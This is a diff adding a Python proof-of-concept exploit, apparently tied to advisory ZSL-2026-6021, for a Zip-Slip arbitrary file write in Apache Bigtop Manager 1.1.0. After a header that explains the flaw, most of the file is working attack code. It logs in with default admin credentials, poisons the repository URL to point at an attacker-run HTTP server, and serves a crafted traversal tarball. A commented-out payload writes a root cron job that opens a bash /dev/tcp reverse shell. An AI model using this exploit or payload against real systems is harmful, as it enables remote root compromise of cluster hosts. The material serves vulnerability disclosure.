@@ -1,0 +1,193 @@
+#!/usr/bin/env python
+#
+#
+# Apache Bigtop Manager 1.1.0 (TarballExtractor) Arbitrary File Write
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://bigtop.apache.org
+# Affected version: 1.1.0
+#
+# Summary: Bigtop Manager is a modern, AI-driven web application designed
+# to simplify the complexity of bigdata cluster management. Provides an easy
+# deployment solution not only for Apache Bigtop components, but also other
+# community version bigdata components.
+#
+# Desc: Apache Bigtop Manager suffer from a path traversal (Zip-Slip) and
+# arbitrary file write vulnerability. The TarballExtractor.extract() routine
+# unpacks service tarballs downloaded from the configured repository URL
+# without validating archive entry paths and creates symbolic links with
+# attacker-controlled targets, so a crafted archive can write files outside
+# the intended extraction directory. Because extraction runs with the privileges
+# of the Bigtop Manager stack (typically root during cluster provisioning),
+# an attacker who can influence the repository or the served tarball can overwrite
+# arbitrary files on the managed hosts and achieve remote code execution.
+#
+# =====================================================================================
+# /src/main/java/org/apache/bigtop/manager/stack/core/tarball/TarballExtractor.java:
+# ----------------------------------------------------------------------------------
+# 77:    private static boolean extract(TarArchiveInputStream ais, Path destDir, int skipLevels) {
+# 78:        try {
+# 79:            TarArchiveEntry entry;
+# 80:            while ((entry = ais.getNextEntry()) != null) {
+# 81:                String entryName = entry.getName();
+# 82:                Path entryPath = Paths.get(entryName);
+# 83:
+# 84:                // Check if it is necessary to skip directories at the specified level
+# 85:                if (entryPath.getNameCount() <= skipLevels) {
+# 86:                    // Skip this entry
+# 87:                    continue;
+# 88:                }
+# 89:
+# 90:                Path relativePath = entryPath.subpath(skipLevels, entryPath.getNameCount());
+# 91:                Path outputPath = destDir.resolve(relativePath);
+# 92:
+# 93:                if (entry.isDirectory()) {
+# 94:                    createDirectories(outputPath);
+# 95:                } else if (entry.isSymbolicLink()) {
+# 96:                    createSymbolicLink(outputPath, entry.getLinkName());
+# 97:                } else {
+# 98:                    createFile(outputPath, ais);
+# 99:                }
+# 100:           }
+# =====================================================================================
+#
+# Tested on: Microsoft Windows 10
+#            OpenJDK Temurin 21.0.6
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6021
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6021
+#
+#
+# 13.08.2026
+#
+
+
+I_LOVE_SNOOPY_TOO = r"""
+         _
+        (:)_
+      ,'    `.
+     :        :
+     |        |              ___
+     |       /|    ______   // _\
+     ; -  _,' :  ,'      `. \\  -\
+    /          \/          \ \\  :
+   (            :  ------.  `-'  |
+____\___    ____|______   \______|_______
+        |::|           '--`
+        |::|  Apache Bigtop Manager 1.1.0
+        |::| TarballExtractor Zip-Slip RCE
+        |::|       Zero Science Lab
+        |::;        ZSL-2026-6021
+        `:/
+"""
+
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+import urllib.request
+import urllib.parse
+import threading
+import hashlib
+import tarfile
+import json
+import time
+import io
+
+CLUSTER_ID      = None
+SERVICE_INSTALL = None
+USER, PASSWD    = "admin", "admin"
+LHOST, LPORT    = "192.168.1.8", 8888
+BIGTOP          = "http://192.168.1.2:8080"
+EVIL_ENTRY      = "bigtop-pkg/../../../../../../../../tmp/bigtop_slip.251"
+EVIL_CONTENT    = b"thricer was here.\n"
+# EVIL_CONTENT  = b"* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/7171 0>&1'\n"
+# EVIL_ENTRY    = "bigtop-pkg/../../../../../../etc/cron.d/zsl"
+
+_DEFAULT_SALT = b"k9@2Uw3*Y@Ccno9c"
+
+def build_tarball():
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+        for name, data in [("bigtop-pkg/VERSION", b"1.1.0\n"), (EVIL_ENTRY, EVIL_CONTENT)]:
+            ti = tarfile.TarInfo(name=name)
+            ti.size, ti.mode, ti.mtime = len(data), 0o644, int(time.time())
+            tar.addfile(ti, io.BytesIO(data))
+    return buf.getvalue()
+
+class PayloadHandler(BaseHTTPRequestHandler):
+    tarball = b""
+    def do_GET(self):
+        print("    [http] agent %s fetched %s -> serving malicious tarball (%d bytes)"
+              % (self.client_address[0], self.path, len(self.tarball)))
+        self.send_response(200)
+        self.send_header("Content-Type", "application/gzip")
+        self.send_header("Content-Length", str(len(self.tarball)))
+        self.end_headers()
+        self.wfile.write(self.tarball)
+    def log_message(self, *a):
+        pass
+
+def serve(tarball):
+    PayloadHandler.tarball = tarball
+    httpd = ThreadingHTTPServer(("0.0.0.0", LPORT), PayloadHandler)
+    threading.Thread(target=httpd.serve_forever, daemon=True).start()
+    print("[+] Payload server: http://%s:%d  (serving %d-byte tarball to any path)" % (LHOST, LPORT, len(tarball)))
+    return httpd
+
+def _pbkdf2(data, salt):
+    return hashlib.pbkdf2_hmac("sha256", data, salt, 600000, 32).hex()
+
+def login_password(user, pw):
+    return _pbkdf2(pw.encode(), _pbkdf2(user.encode(), _DEFAULT_SALT).encode())
+
+def api(method, path, token=None, body=None):
+    data = json.dumps(body).encode() if body is not None else None
+    req = urllib.request.Request(BIGTOP + path, data=data, method=method)
+    req.add_header("Content-Type", "application/json")
+    if token:
+        req.add_header("Token", token)
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return json.loads(r.read().decode())
+
+def exploit():
+    nonce = api("GET", "/api/nonce?username=" + urllib.parse.quote(USER)).get("data")
+    lr = api("POST", "/api/login", body={"username": USER, "password": login_password(USER, PASSWD), "nonce": nonce})
+    token = (lr.get("data") or {}).get("token")
+    if not token:
+        print("[-] Login failed: %s" % lr); return
+    print("[+] Authenticated       : %s  (JWT %s...)" % (USER, token[:20]))
+
+    repos = api("GET", "/api/repos", token=token).get("data") or []
+    print("[*] Repos before        : " + ", ".join("%s=%s" % (r.get("id"), r.get("baseUrl")) for r in repos))
+    poisoned = [{"id": r.get("id"), "baseUrl": "http://%s:%d/" % (LHOST, LPORT)} for r in repos]
+    api("PUT", "/api/repos", token=token, body=poisoned)
+    print("[+] Repos poisoned      : baseUrl -> http://%s:%d/" % (LHOST, LPORT))
+
+    if CLUSTER_ID and SERVICE_INSTALL:
+        cmd = {"command": "ADD", "clusterId": CLUSTER_ID, "commandLevel": "SERVICE", "serviceCommands": [SERVICE_INSTALL]}
+        print("[+] Install triggered   : %s" % api("POST", "/api/command", token=token, body=cmd).get("data"))
+    else:
+        print("[*] Nope.")
+
+if __name__ == "__main__":
+	#WAIT
+    print(I_LOVE_SNOOPY_TOO)
+    tarball = build_tarball()
+    print("[+] Malicious tarball: %d bytes, evil entry '%s'" % (len(tarball), EVIL_ENTRY))
+    serve(tarball)
+    print("[*] Target Bigtop Manager: %s\n" % BIGTOP)
+    try:
+        exploit()
+    except Exception as e:
+        print("[-] %s: %s" % (type(e).__name__, e))
+    print("\n[*] Waiting for agents to fetch the tarball (Ctrl-C to stop) ...")
+
+    try:
+        while True:
+            time.sleep(3600)
+    except KeyboardInterrupt:
+        print("\n[*] Done.")
